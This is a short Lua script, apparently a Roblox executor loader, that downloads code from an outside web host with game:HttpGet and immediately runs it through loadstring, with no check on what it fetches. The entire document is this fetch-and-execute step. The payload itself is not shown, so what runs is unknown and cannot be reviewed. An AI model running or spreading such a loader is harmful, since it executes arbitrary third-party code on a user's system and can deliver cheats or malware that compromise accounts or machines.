local s = game:HttpGet("https://apidogbuddy.lovable.app/api/public/files/fc7e89bd075d2c33?stage=src")
local f, e = loadstring(s)
if not f then error("RunBuddy: " .. tostring(e)) end
return f()